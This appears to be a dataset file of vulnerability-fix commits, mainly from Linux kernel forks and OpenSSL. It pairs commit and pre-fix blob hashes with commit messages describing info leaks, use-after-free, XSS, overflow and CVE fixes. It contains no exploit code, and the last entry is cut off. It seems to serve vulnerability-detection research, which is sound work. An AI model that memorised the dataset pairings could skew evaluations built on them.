netfilter: nf_conntrack: reserve two bytes for nf_ct_ext->len\n\n"len" contains sizeof(nf_ct_ext) and size of extensions. In a worst case it can contain all extensions. Bellow you can find sizes for all types of extensions. Their sum is definitely bigger than 256.\n\nnf_ct_ext_types[0]->len = 24 nf_ct_ext_types[1]->len = 32 nf_ct_ext_types[2]->len = 24 nf_ct_ext_types[3]->len = 32 nf_ct_ext_types[4]->len = 152 nf_ct_ext_types[5]->len = 2 nf_ct_ext_types[6]->len = 16 nf_ct_ext_types[7]->len = 8\n\nI have seen "len" up to 280 and my host has crashes w/o this patch.\n\nThe right way to fix this problem is reducing the size of the ecache extension (4) and Florian is going to do this, but these changes will be quite large to be appropriate for a stable tree.\n\nFixes: 5b423f6a40a0 (netfilter: nf_conntrack: fix racy timer handling with reliable) Cc: Pablo Neira Ayuso <pablo@netfilter.org> Cc: Patrick McHardy <kaber@trash.net> Cc: Jozsef Kadlecsik <kadlec@blackhole.kfki.hu> Cc: "David S. Miller" <davem@davemloft.net> Signed-off-by: Andrey Vagin <avagin@openvz.org> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

======================================================================
Commit With Fix: 
    e159332b9af4b04d882dbcfe1bb0117f0a6d4b58
File(s) In Commit: 
    fs/udf/inode.c
Blob(s) In Commit: 
    5bc71d9a674a7e5dfc3ff882ee61a2591a328c7b
Blob(s) Before Fix: 
    062b7925bca04c02949919ac37aab790d7b982a2
    08598843288fe0c2dd206940d6437c606ef41c1f
    1d1358ed80c13e5da17849c7773bc8a6d1861e7c
    236cd48184c2df20e75bc9fee098ded782f2560f
    287cd5f234210e0eb502d4b5cd60b2aaf402478e
    5d643706212f411a63b0804d4c896941aecb13d8
    873e1bab9c4c70cf45ed6bac6e46495decfbd55d
    982ce05c87ed61c86dfc9200731a28f2db44b70b
    a445d599098d7ad1ccace2a81a86a0bc563af391
    a932f7740b51714b47bada9099e5cdb966f79002
    b6d15d349810fe5ca21649208bd86d220caf338c
    bf08a9fbb97ee0ec4ba1932db2eb44ae77cdf416
    c9b4df5810d52560b084b9557150faf8cfbe6e29
Projects:
    0-T-0_ps4-linux
Commit Message for e159332b9af4b04d882dbcfe1bb0117f0a6d4b58:
udf: Verify i_size when loading inode\n\nVerify that inode size is sane when loading inode with data stored in ICB. Otherwise we may get confused later when working with the inode and inode size is too big.\n\nCC: stable@vger.kernel.org Reported-by: Carl Henrik Lunde <chlunde@ping.uio.no> Signed-off-by: Jan Kara <jack@suse.cz>

======================================================================
Commit With Fix: 
    e237ec37ec154564f8690c5bd1795339955eeef9
File(s) In Commit: 
    fs/udf/symlink.c
Blob(s) In Commit: 
    ac10ca939f267283ba0f64da9d4ec82de0eeeb61
Blob(s) Before Fix: 
    0422b7b8369f079b45a5bb631c9d3bd826f6a6ca
    0f1b3a2654b9459a36c4df943f1f22a3bff070af
    6fb7945c1e6e8813afce2ad81aa41ea28a6f4565
    862535b3ba58a8a6f6ca3d23b35b0b66fee36c22
    b1d4488b0f14ad3aad14aeb519877bc38f1f209a
    d7b63cc8caafe1720c22da481b47eec640b8f96b
    d7c6dbe4194bb33bbe37930c63cf23377e5d9343
    d89f324bc38797220f6afcd09962e63d2c70c1e4
Projects:
    0-T-0_ps4-linux
Commit Message for e237ec37ec154564f8690c5bd1795339955eeef9:
udf: Check component length before reading it\n\nCheck that length specified in a component of a symlink fits in the input buffer we are reading. Also properly ignore component length for component types that do not use it. Otherwise we read memory after end of buffer for corrupted udf image.\n\nReported-by: Carl Henrik Lunde <chlunde@ping.uio.no> CC: stable@vger.kernel.org Signed-off-by: Jan Kara <jack@suse.cz>

======================================================================
Commit With Fix: 
    725c7dbb95bfaf8b4bb7b04820e3a00cceea9ce6
File(s) In Commit: 
    src/file_io.c
Blob(s) In Commit: 
    6ccab78ea805b2e9e68fbb5cd844aae24c128980
Blob(s) Before Fix: 
    26d3d6d6aed8da28f7741cb27aac528fa348cf82
Projects:
    12gjang_libsndfile
Commit Message for 725c7dbb95bfaf8b4bb7b04820e3a00cceea9ce6:
src/file_io.c : Prevent potential divide-by-zero.\n\nCloses: https://github.com/erikd/libsndfile/issues/92

======================================================================
Commit With Fix: 
    e35b990464a2c2cf64d6833a217ed944876e7732
File(s) In Commit: 
    html/index.php
Blob(s) In Commit: 
    ab83e113f09536a62123c09e5b447724b11669d4
Blob(s) Before Fix: 
    364301e9ca13f096458faf52739e9272c1ce191d
Projects:
    Maaici_gosa-core
Commit Message for e35b990464a2c2cf64d6833a217ed944876e7732:
escape html entities to fix xss at the login screen\n\n git-svn-id: https://oss.gonicus.de/repositories/gosa/trunk@21276 594d385d-05f5-0310-b6e9-bd551577e9d8

======================================================================
Commit With Fix: 
    c597156adc60a45b5f827793cd420945f47bc03b
File(s) In Commit: 
    modules/chanserv/flags.c
Blob(s) In Commit: 
    72d8fcfbd390dc4784f176af7a57b4cfa04d28c8
Blob(s) Before Fix: 
    289345d852f47666ada7d16f2cfe9f2bec323572
Projects:
    Acidburn0zzz_atheme
Commit Message for c597156adc60a45b5f827793cd420945f47bc03b:
chanserv/flags: make Anope FLAGS compatibility an option\n\nPreviously, ChanServ FLAGS behavior could be modified by registering or dropping the keyword nicks "LIST", "CLEAR", and "MODIFY". Now, a configuration option is available that when turned on (default), disables registration of these keyword nicks and enables this compatibility feature. When turned off, registration of these keyword nicks is possible, and compatibility to Anope's FLAGS command is disabled.\n\nFixes atheme/atheme#397

======================================================================
Commit With Fix: 
    0ea1ec713f04bdfac343c9702b21cd3a7c711826
File(s) In Commit: 
    arch/arm/mm/dma-mapping.c
Blob(s) In Commit: 
    57438506d52461aaac70c12f6cd9a2b4384b6e34
Blob(s) Before Fix: 
    f5e1a8471714cd421e2ab9dee54ae88f144316d1
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 0ea1ec713f04bdfac343c9702b21cd3a7c711826:
ARM: dma-mapping: don't allow DMA mappings to be marked executable\n\nDMA mapping permissions were being derived from pgprot_kernel directly without using PAGE_KERNEL.  This causes them to be marked with executable permission, which is not what we want.  Fix this.\n\nSigned-off-by: Russell King <rmk+kernel@arm.linux.org.uk>

======================================================================
Commit With Fix: 
    c88e739b1fad662240e99ecbd0bdaac871717987
File(s) In Commit: 
    drivers/media/media-device.c
Blob(s) In Commit: 
    d5a7a135f75d39d5bc2f6fb3366639dd6dc7ee34
Blob(s) Before Fix: 
    16b70b4412f79a5afa226ec2acd350fb4e2e28df
    1957c0df08fdb5717acedbf17162774f8c75dd05
    6edc9ba81203698e9948c066ddfac2370a142b1d
    6f9eb94e85b387f78f144fd74c244e0e0859237a
    703560fa5e73b456cbc0951ccb61957bdfecebac
    7b39440192d61a7f91b0896c406beea751d8d515
    88c1606fd5555f5b535d0d5068cef0e691c5cb85
    aa010435966eb54f44b9c46f3662b320ef56d020
    d01fcb7e87c2558e1b2c48c504d7dda0efada8df
    fdb5840f034ba7915c610e4c8a3bf9d6ccebf914
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c88e739b1fad662240e99ecbd0bdaac871717987:
[media] media: info leak in __media_device_enum_links()\n\nThese structs have holes and reserved struct members which aren't cleared.  I've added a memset() so we don't leak stack information.\n\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com> Signed-off-by: Laurent Pinchart <laurent.pinchart@ideasonboard.com> Signed-off-by: Mauro Carvalho Chehab <mchehab@redhat.com>

======================================================================
Commit With Fix: 
    4efbc454ba68def5ef285b26ebfcfdb605b52755
File(s) In Commit: 
    kernel/sched/core.c
Blob(s) In Commit: 
    a6e7470166c7e6ad19fdef5ba7e359fa98a00c8a
Blob(s) Before Fix: 
    33d030a133d2b0511701deb79f6b993197639818
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 4efbc454ba68def5ef285b26ebfcfdb605b52755:
sched: Fix information leak in sys_sched_getattr()\n\nWe're copying the on-stack structure to userspace, but forgot to give the right number of bytes to copy. This allows the calling process to obtain up to PAGE_SIZE bytes from the stack (and possibly adjacent kernel memory).\n\nThis fix copies only as much as we actually have on the stack (attr->size defaults to the size of the struct) and leaves the rest of the userspace-provided buffer untouched.\n\nFound using kmemcheck + trinity.\n\nFixes: d50dde5a10f30 ("sched: Add new scheduler syscalls to support an extended scheduling parameters ABI") Cc: Dario Faggioli <raistlin@linux.it> Cc: Juri Lelli <juri.lelli@gmail.com> Cc: Ingo Molnar <mingo@kernel.org> Signed-off-by: Vegard Nossum <vegard.nossum@oracle.com> Signed-off-by: Peter Zijlstra <peterz@infradead.org> Link: http://lkml.kernel.org/r/1392585857-10725-1-git-send-email-vegard.nossum@oracle.com Signed-off-by: Thomas Gleixner <tglx@linutronix.de>

======================================================================
Commit With Fix: 
    6217e5ede23285ddfee10d2e4ba0cc2d4c046205
File(s) In Commit: 
    sound/core/compress_offload.c
Blob(s) In Commit: 
    89028fab64fdd27bd75698e651fdc3b26b424941
Blob(s) Before Fix: 
    0d430adee88d6a142917fa77d720b962cd44f91b
    1edb2e822074d47df2e35ae148fb2521bbf70f8e
    3fdf998ad0576d864ffca38691832aec3ff7e659
    53cd5d69293e9e39c2cce46d21abf5fd78d46e73
    6554e3cd2ce1491f8192e3c02037105b13c85e38
    7403f348ed1425733ce77735c8dff37d1610ad4d
    7a20897d33dbc1147b381ca6884f87dc88eb7ff1
    98969541cbcc9c62ff81afb9818d2399dd6e7eb0
    99db892d7299056568e5432bdd660ea14d3143c6
    9d518ac73eea064a6b4d918d3dba072cb50102f5
    a68aed7fce0205462ce08183f560015eeb0060cb
    ad11dc994792b4bb080c49a7036b8761731e5a1d
    b123c42e7dc8995be7fc948952500f74508f5034
    bea523a5d852e11f9d06e1d682e065b699f347c8
    c84abc886e901459f316c29fecb6c9f65d337bb2
    dac3633507c9631a300abb4d7f3c35bbaa3ddb5a
    ec2118d0e27aca3f5fef6c2ddd72f8b166ce98ca
Projects:
    0-T-0_ps4-linux
Commit Message for 6217e5ede23285ddfee10d2e4ba0cc2d4c046205:
ALSA: compress: fix an integer overflow check\n\nI previously added an integer overflow check here but looking at it now, it's still buggy.\n\nThe bug happens in snd_compr_allocate_buffer().  We multiply ".fragments" and ".fragment_size" and that doesn't overflow but then we save it in an unsigned int so it truncates the high bits away and we allocate a smaller than expected size.\n\nFixes: b35cc8225845 ('ALSA: compress_core: integer overflow in snd_compr_allocate_buffer()') Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    a56ae87a4c1c1fead7d09c3653905841ccccf1cc
File(s) In Commit: 
    dbdimp.c
Blob(s) In Commit: 
    bcb35f0c334b1db40d2302fbef1cd2e02847dec1
Blob(s) Before Fix: 
    0aaa5f1adbc4bbfbdce63c467fc08cec6719fb80
Projects:
    Acidburn0zzz_DBD-mysql
Commit Message for a56ae87a4c1c1fead7d09c3653905841ccccf1cc:
fix use-after-free crash in RT #97625

======================================================================
Commit With Fix: 
    9709674e68646cee5a24e3000b3558d25412203a
File(s) In Commit: 
    net/ipv4/datagram.c
Blob(s) In Commit: 
    a3095fdefbed98ed4e320ac6c44ea3e18241d1a4
Blob(s) Before Fix: 
    19e36376d2a083b5c8b307208ebd17ade086dcaa
    424fafbc8cb02c49fb2dd3551f3583290f2fc330
    5f3dc1df04bf28a8bc7b993cff545f8beff08192
    8b5134c582f147a94938c34a01dd0691c288bb78
    b28e863fe0a7143b199bee51cfdf242c125f31cf
    f0c307cb61963ba00276673d606e844c99769e71
    f915abff1350a86af8d5bb89725b751c061b0fb5
Projects:
    0-T-0_ps4-linux
Commit Message for 9709674e68646cee5a24e3000b3558d25412203a:
ipv4: fix a race in ip4_datagram_release_cb()\n\nAlexey gave a AddressSanitizer[1] report that finally gave a good hint at where was the origin of various problems already reported by Dormando in the past [2]\n\nProblem comes from the fact that UDP can have a lockless TX path, and concurrent threads can manipulate sk_dst_cache, while another thread, is holding socket lock and calls __sk_dst_set() in ip4_datagram_release_cb() (this was added in linux-3.8)\n\nIt seems that all we need to do is to use sk_dst_check() and sk_dst_set() so that all the writers hold same spinlock (sk->sk_dst_lock) to prevent corruptions.\n\nTCP stack do not need this protection, as all sk_dst_cache writers hold the socket lock.\n\n[1] https://code.google.com/p/address-sanitizer/wiki/AddressSanitizerForKernel\n\nAddressSanitizer: heap-use-after-free in ipv4_dst_check Read of size 2 by thread T15453:  [<ffffffff817daa3a>] ipv4_dst_check+0x1a/0x90 ./net/ipv4/route.c:1116  [<ffffffff8175b789>] __sk_dst_check+0x89/0xe0 ./net/core/sock.c:531  [<ffffffff81830a36>] ip4_datagram_release_cb+0x46/0x390 ??:0  [<ffffffff8175eaea>] release_sock+0x17a/0x230 ./net/core/sock.c:2413  [<ffffffff81830882>] ip4_datagram_connect+0x462/0x5d0 ??:0  [<ffffffff81846d06>] inet_dgram_connect+0x76/0xd0 ./net/ipv4/af_inet.c:534  [<ffffffff817580ac>] SYSC_connect+0x15c/0x1c0 ./net/socket.c:1701  [<ffffffff817596ce>] SyS_connect+0xe/0x10 ./net/socket.c:1682  [<ffffffff818b0a29>] system_call_fastpath+0x16/0x1b ./arch/x86/kernel/entry_64.S:629\n\nFreed by thread T15455:  [<ffffffff8178d9b8>] dst_destroy+0xa8/0x160 ./net/core/dst.c:251  [<ffffffff8178de25>] dst_release+0x45/0x80 ./net/core/dst.c:280  [<ffffffff818304c1>] ip4_datagram_connect+0xa1/0x5d0 ??:0  [<ffffffff81846d06>] inet_dgram_connect+0x76/0xd0 ./net/ipv4/af_inet.c:534  [<ffffffff817580ac>] SYSC_connect+0x15c/0x1c0 ./net/socket.c:1701  [<ffffffff817596ce>] SyS_connect+0xe/0x10 ./net/socket.c:1682  [<ffffffff818b0a29>] system_call_fastpath+0x16/0x1b ./arch/x86/kernel/entry_64.S:629\n\nAllocated by thread T15453:  [<ffffffff8178d291>] dst_alloc+0x81/0x2b0 ./net/core/dst.c:171  [<ffffffff817db3b7>] rt_dst_alloc+0x47/0x50 ./net/ipv4/route.c:1406  [<     inlined    >] __ip_route_output_key+0x3e8/0xf70 __mkroute_output ./net/ipv4/route.c:1939  [<ffffffff817dde08>] __ip_route_output_key+0x3e8/0xf70 ./net/ipv4/route.c:2161  [<ffffffff817deb34>] ip_route_output_flow+0x14/0x30 ./net/ipv4/route.c:2249  [<ffffffff81830737>] ip4_datagram_connect+0x317/0x5d0 ??:0  [<ffffffff81846d06>] inet_dgram_connect+0x76/0xd0 ./net/ipv4/af_inet.c:534  [<ffffffff817580ac>] SYSC_connect+0x15c/0x1c0 ./net/socket.c:1701  [<ffffffff817596ce>] SyS_connect+0xe/0x10 ./net/socket.c:1682  [<ffffffff818b0a29>] system_call_fastpath+0x16/0x1b ./arch/x86/kernel/entry_64.S:629\n\n[2] <4>[196727.311203] general protection fault: 0000 [#1] SMP <4>[196727.311224] Modules linked in: xt_TEE xt_dscp xt_DSCP macvlan bridge coretemp crc32_pclmul ghash_clmulni_intel gpio_ich microcode ipmi_watchdog ipmi_devintf sb_edac edac_core lpc_ich mfd_core tpm_tis tpm tpm_bios ipmi_si ipmi_msghandler isci igb libsas i2c_algo_bit ixgbe ptp pps_core mdio <4>[196727.311333] CPU: 17 PID: 0 Comm: swapper/17 Not tainted 3.10.26 #1 <4>[196727.311344] Hardware name: Supermicro X9DRi-LN4+/X9DR3-LN4+/X9DRi-LN4+/X9DR3-LN4+, BIOS 3.0 07/05/2013 <4>[196727.311364] task: ffff885e6f069700 ti: ffff885e6f072000 task.ti: ffff885e6f072000 <4>[196727.311377] RIP: 0010:[<ffffffff815f8c7f>]  [<ffffffff815f8c7f>] ipv4_dst_destroy+0x4f/0x80 <4>[196727.311399] RSP: 0018:ffff885effd23a70  EFLAGS: 00010282 <4>[196727.311409] RAX: dead000000200200 RBX: ffff8854c398ecc0 RCX: 0000000000000040 <4>[196727.311423] RDX: dead000000100100 RSI: dead000000100100 RDI: dead000000200200 <4>[196727.311437] RBP: ffff885effd23a80 R08: ffffffff815fd9e0 R09: ffff885d5a590800 <4>[196727.311451] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000 <4>[196727.311464] R13: ffffffff81c8c280 R14: 0000000000000000 R15: ffff880e85ee16ce <4>[196727.311510] FS:  0000000000000000(0000) GS:ffff885effd20000(0000) knlGS:0000000000000000 <4>[196727.311554] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 <4>[196727.311581] CR2: 00007a46751eb000 CR3: 0000005e65688000 CR4: 00000000000407e0 <4>[196727.311625] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000 <4>[196727.311669] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400 <4>[196727.311713] Stack: <4>[196727.311733]  ffff8854c398ecc0 ffff8854c398ecc0 ffff885effd23ab0 ffffffff815b7f42 <4>[196727.311784]  ffff88be6595bc00 ffff8854c398ecc0 0000000000000000 ffff8854c398ecc0 <4>[196727.311834]  ffff885effd23ad0 ffffffff815b86c6 ffff885d5a590800 ffff8816827821c0 <4>[196727.311885] Call Trace: <4>[196727.311907]  <IRQ> <4>[196727.311912]  [<ffffffff815b7f42>] dst_destroy+0x32/0xe0 <4>[196727.311959]  [<ffffffff815b86c6>] dst_release+0x56/0x80 <4>[196727.311986]  [<ffffffff81620bd5>] tcp_v4_do_rcv+0x2a5/0x4a0 <4>[196727.312013]  [<ffffffff81622b5a>] tcp_v4_rcv+0x7da/0x820 <4>[196727.312041]  [<ffffffff815fd9e0>] ? ip_rcv_finish+0x360/0x360 <4>[196727.312070]  [<ffffffff815de02d>] ? nf_hook_slow+0x7d/0x150 <4>[196727.312097]  [<ffffffff815fd9e0>] ? ip_rcv_finish+0x360/0x360 <4>[196727.312125]  [<ffffffff815fda92>] ip_local_deliver_finish+0xb2/0x230 <4>[196727.312154]  [<ffffffff815fdd9a>] ip_local_deliver+0x4a/0x90 <4>[196727.312183]  [<ffffffff815fd799>] ip_rcv_finish+0x119/0x360 <4>[196727.312212]  [<ffffffff815fe00b>] ip_rcv+0x22b/0x340 <4>[196727.312242]  [<ffffffffa0339680>] ? macvlan_broadcast+0x160/0x160 [macvlan] <4>[196727.312275]  [<ffffffff815b0c62>] __netif_receive_skb_core+0x512/0x640 <4>[196727.312308]  [<ffffffff811427fb>] ? kmem_cache_alloc+0x13b/0x150 <4>[196727.312338]  [<ffffffff815b0db1>] __netif_receive_skb+0x21/0x70 <4>[196727.312368]  [<ffffffff815b0fa1>] netif_receive_skb+0x31/0xa0 <4>[196727.312397]  [<ffffffff815b1ae8>] napi_gro_receive+0xe8/0x140 <4>[196727.312433]  [<ffffffffa00274f1>] ixgbe_poll+0x551/0x11f0 [ixgbe] <4>[196727.312463]  [<ffffffff815fe00b>] ? ip_rcv+0x22b/0x340 <4>[196727.312491]  [<ffffffff815b1691>] net_rx_action+0x111/0x210 <4>[196727.312521]  [<ffffffff815b0db1>] ? __netif_receive_skb+0x21/0x70 <4>[196727.312552]  [<ffffffff810519d0>] __do_softirq+0xd0/0x270 <4>[196727.312583]  [<ffffffff816cef3c>] call_softirq+0x1c/0x30 <4>[196727.312613]  [<ffffffff81004205>] do_softirq+0x55/0x90 <4>[196727.312640]  [<ffffffff81051c85>] irq_exit+0x55/0x60 <4>[196727.312668]  [<ffffffff816cf5c3>] do_IRQ+0x63/0xe0 <4>[196727.312696]  [<ffffffff816c5aaa>] common_interrupt+0x6a/0x6a <4>[196727.312722]  <EOI> <1>[196727.313071] RIP  [<ffffffff815f8c7f>] ipv4_dst_destroy+0x4f/0x80 <4>[196727.313100]  RSP <ffff885effd23a70> <4>[196727.313377] ---[ end trace 64b3f14fae0f2e29 ]--- <0>[196727.380908] Kernel panic - not syncing: Fatal exception in interrupt\n\nReported-by: Alexey Preobrazhensky <preobr@google.com> Reported-by: dormando <dormando@rydia.ne> Signed-off-by: Eric Dumazet <edumazet@google.com> Fixes: 8141ed9fcedb2 ("ipv4: Add a socket release callback for datagram sockets") Cc: Steffen Klassert <steffen.klassert@secunet.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    60a2362f769cf549dc466134efe71c8bf9fbaaba
File(s) In Commit: 
    drivers/regulator/core.c
Blob(s) In Commit: 
    47a455cfe04fb344409a1f48ac52a7c9450edad3
Blob(s) Before Fix: 
    cd87c0c37034de32ad2f2c7ae2085d4761041761
    df2af3a11351aaf642b2b2cacb99509c349513c7
Projects:
    0-T-0_ps4-linux
Commit Message for 60a2362f769cf549dc466134efe71c8bf9fbaaba:
regulator: core: Fix regualtor_ena_gpio_free not to access pin after freeing\n\nAfter freeing pin from regulator_ena_gpio_free, loop can access the pin. So this patch fixes not to access pin after freeing.\n\nSigned-off-by: Seung-Woo Kim <sw0312.kim@samsung.com> Signed-off-by: Mark Brown <broonie@kernel.org>

======================================================================
Commit With Fix: 
    1421e0c584ae9120ca1b88098f13d6d2e90b83a3
File(s) In Commit: 
    ssl/s3_srvr.c
Blob(s) In Commit: 
    8550c1b7833e7ce5b2e585f614623a44ebdf2d2f
Blob(s) Before Fix: 
    90e95d6bc11fb4908156437673aaec9f4e8c6927
    9434923d0d5ea37ae169214d08ebbe4dd2440131
Projects:
    0902710055_openssl
Commit Message for 1421e0c584ae9120ca1b88098f13d6d2e90b83a3:
Unauthenticated DH client certificate fix.\n\nFix to prevent use of DH client certificates without sending certificate verify message.\n\nIf we've used a client certificate to generate the premaster secret ssl3_get_client_key_exchange returns 2 and ssl3_get_cert_verify is never called.\n\nWe can only skip the certificate verify message in ssl3_get_cert_verify if the client didn't send a certificate.\n\nThanks to Karthikeyan Bhargavan for reporting this issue. CVE-2015-0205 Reviewed-by: Matt Caswell <matt@openssl.org>

======================================================================
Commit With Fix: 
    103b171d8fc282ef435f8de9afbf7782e312961f
File(s) In Commit: 
    ssl/d1_pkt.c
Blob(s) In Commit: 
    a8a06b439bad3bc0d190a1de9aabb5ab5ac59853
Blob(s) Before Fix: 
    1028e41b562c510c2af4c14eecc21c3669c806ed
    aefd85d0c3516948d381c6c69423a5234014596a
Projects:
    0902710055_openssl
Commit Message for 103b171d8fc282ef435f8de9afbf7782e312961f:
A memory leak can occur in dtls1_buffer_record if either of the calls to ssl3_setup_buffers or pqueue_insert fail. The former will fail if there is a malloc failure, whilst the latter will fail if attempting to add a duplicate record to the queue. This should never happen because duplicate records should be detected and dropped before any attempt to add them to the queue. Unfortunately records that arrive that are for the next epoch are not being recorded correctly, and therefore replays are not being detected. Additionally, these "should not happen" failures that can occur in dtls1_buffer_record are not being treated as fatal and therefore an attacker could exploit this by sending repeated replay records for the next epoch, eventually causing a DoS through memory exhaustion.\n\nThanks to Chris Mueller for reporting this issue and providing initial analysis and a patch. Further analysis and the final patch was performed by Matt Caswell from the OpenSSL development team.\n\nCVE-2015-0206\n\nReviewed-by: Dr Stephen Henson <steve@openssl.org>

======================================================================
Commit With Fix: 
    f3747379accba8e95d70cec0eae0582c8c182050
File(s) In Commit: 
    arch/x86/kvm/emulate.c
Blob(s) In Commit: 
    de12c1d379f16899645d96a2c3fd75663919c86d
Blob(s) Before Fix: 
    03954f7900f522a496d8249174ec63cc760aa140
    07ffca0a89e945b8dafbd7ce5a237652da597334
    106c01557f2b63706eca28e462a3b072b590f0c5
    169b09d76ddd83d3033d93d2b7eace6fada2331e
    205b17eed93c2bfa0d402414a29bac9ed4fb3e5f
    5edf088ca51e11789d6d26e3bfbdad16c1104220
    817c6ca2c4fbf0353db31c5adfea80338a4f7c55
    8b4cc5f067de5977595d2cf43d139b10acf9e2d0
    9f8a2faf50407b6212f71a5de81aea8680855f87
    a46207a0583508ad662d179f2db1ede320a7645e
    c7327a7761caf679c1d3d8c56d26671011a5eba1
    d37b628b98c080ced2d622768c2c06ee82989377
    e0b794a84c35cdd7ecc03bc6de6500b0ac237f57
    e25a5ae381ba21fda8d2d0ee11a6a3bdc9b88e5f
    e4e833d3d7d7bb826907f7053d56c1c45748e476
Projects:
    0-T-0_ps4-linux
Commit Message for f3747379accba8e95d70cec0eae0582c8c182050:
KVM: x86: SYSENTER emulation is broken\n\nSYSENTER emulation is broken in several ways: 1. It misses the case of 16-bit code segments completely (CVE-2015-0239). 2. MSR_IA32_SYSENTER_CS is checked in 64-bit mode incorrectly (bits 0 and 1 can    still be set without causing #GP). 3. MSR_IA32_SYSENTER_EIP and MSR_IA32_SYSENTER_ESP are not masked in    legacy-mode. 4. There is some unneeded code.\n\nFix it.\n\nCc: stable@vger.linux.org Signed-off-by: Nadav Amit <namit@cs.technion.ac.il> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    0f2af21aae11972fa924374ddcf52e88347cf5a8
File(s) In Commit: 
    fs/ext4/extents.c
Blob(s) In Commit: 
    3cc17aacc4c7d01fc3816a217654ec5d8706094e
Blob(s) Before Fix: 
    2e6af88d112f3046920aba303ce2d8d35ff42452
Projects:
    0-T-0_ps4-linux
Commit Message for 0f2af21aae11972fa924374ddcf52e88347cf5a8:
ext4: allocate entire range in zero range\n\nCurrently there is a bug in zero range code which causes zero range calls to only allocate block aligned portion of the range, while ignoring the rest in some cases.\n\nIn some cases, namely if the end of the range is past i_size, we do attempt to preallocate the last nonaligned block. However this might cause kernel to BUG() in some carefully designed zero range requests on setups where page size > block size.\n\nFix this problem by first preallocating the entire range, including the nonaligned edges and converting the written extents to unwritten in the next step. This approach will also give us the advantage of having the range to be as linearly contiguous as possible.\n\nSigned-off-by: Lukas Czerner <lczerner@redhat.com> Signed-off-by: Theodore Ts'o <tytso@mit.edu>

======================================================================
Commit With Fix: 
    66ab38918c911bcff025562cf06237d7fedaba0c
File(s) In Commit: 
    src/unix/process.c
Blob(s) In Commit: 
    1efd588b86ef8fcff0f75a1a999c104f2288cadc
Blob(s) Before Fix: 
    0fc8f640197a85d9c6556b668bb6b5acb0ca2a1d
Projects:
    0-wiz-0_libuv
Commit Message for 66ab38918c911bcff025562cf06237d7fedaba0c:
unix: call setgoups before calling setuid/setgid\n\nPartial fix for #1093

======================================================================
Commit With Fix: 
    474a3db19498765f0118ba3dbc0b1cc90b0097fc
File(s) In Commit: 
    src/backend/bs_srcserver
Blob(s) In Commit: 
    223611c1bc5d818532f5cd8f94a017308d5127ab
Blob(s) Before Fix: 
    1a93608aace2684f7ac3b64b9358f1701ed6479e
Projects:
    Abdelhamidhenni_open-build-service
Commit Message for 474a3db19498765f0118ba3dbc0b1cc90b0097fc:
[backend] sanity check the result of the external patch command\n\nSimple files only, please.

======================================================================
Commit With Fix: 
    4cfed6b0a625593fb43876f04badc4dd99799d86
File(s) In Commit: 
    src/daemon/Greeter.cpp
Blob(s) In Commit: 
    8c936b7d5ebfc6f76e420139459c8667d40e7d0a
Blob(s) Before Fix: 
    68c4dc38ab43282c64f57658957245e5225d86b1
Projects:
    AOSC-Dev_sddm
Commit Message for 4cfed6b0a625593fb43876f04badc4dd99799d86:
Disable greeters from loading KDE's debug hander\n\nSome themes may use KDE components which will automatically load KDE's crash handler.\n\nIf the greeter were to then somehow crash, that would leave a crash handler allowing other actions, albeit as the locked down SDDM user.\n\nOnly SDDM users using the breeze theme from plasma-workspace are affected. Safest and simplest fix is to handle this inside SDDM disabling kcrash via an environment variable for all future themes that may use these libraries.\n\nCVE-2015-0856

======================================================================
Commit With Fix: 
    1bc272874a86eaab99dccd00b29177423fd83877
File(s) In Commit: 
    classes/adminpage.inc.php
Blob(s) In Commit: 
    ee99b866c5891bcd9a52c3e985e16375a90c3334
Blob(s) Before Fix: 
    f6a1d9f1abdb894604687965dc850af0f2f923b4
Projects:
    mylex_saurus
Commit Message for 1bc272874a86eaab99dccd00b29177423fd83877:
Fix stored and reflected XSS vulnerabilities\n\nas described in VN: JVN#18387086 / TN: JPCERT#95011159 advisory.

======================================================================
Commit With Fix: 
    7de61b4c6244af9ff8e75a2c92a570f3b075309c
File(s) In Commit: 
    cas-server-support-ldap/src/main/java/org/jasig/cas/util/LdapUtils.java
Blob(s) In Commit: 
    e90bbaaa9d6d0730c2eb30277eda5c67c5f8a98c
Blob(s) Before Fix: 
    4b256f6df370d925a12f147c2f33b209564367e6
Projects:
    08guye_cas
Commit Message for 7de61b4c6244af9ff8e75a2c92a570f3b075309c:
Merge pull request #411 from serac/CAS-1429-ldap-filter-encoding\n\nCAS-1429 Escape inputs into LDAP filter expressions.

======================================================================
Commit With Fix: 
    fdad1406b3ec809f4954ff7cdf9e99eb18c2458f
File(s) In Commit: 
    pigz.c
Blob(s) In Commit: 
    38c0d4fec22f33537cc3b26a5e13946a3514c4f1
Blob(s) Before Fix: 
    ca307a5392b3482ff4a64e7f92c77302a7a769c1
Projects:
    AOKP_external_pigz
Commit Message for fdad1406b3ec809f4954ff7cdf9e99eb18c2458f:
When decompressing with -N or -NT, strip any path from header name.\n\nThis uses the path of the compressed file combined with the name from the header as the name of the decompressed output file.  Any path information in the header name is stripped.  This avoids a possible vulnerability where absolute or descending paths are put in the gzip header.

======================================================================
Commit With Fix: 
    ca4da5dd1f99fe9c59f1709fb43e818b18ad20e0
File(s) In Commit: 
    security/keys/keyring.c
Blob(s) In Commit: 
    d33437007ad229313a5ef483826e427a74350876
Blob(s) Before Fix: 
    2fb2576dc6448b3c1020dc311e0d81bfe77fb768
    30e242f7bd0ec413bca908f1a0fdc5398b00a124
    37a7f3b28852e098f57ab1cd98eb2eccdad5c7c5
    41bcf57e96f21c5eef258b72a1b119b2fda172fd
    4e9b4d23e20efe88f9e4d87bfc5e305d74041829
    6d913f40b6f0b960025fd68767827127af7afe0e
    6ece7f2e5707f45c2736ca4a05504c2dd391ea00
    8177010174f7b3d47773a43e48bf2b171b264c5f
    9cf2575f0d97c8b237928f1e1ab46b4ad3895653
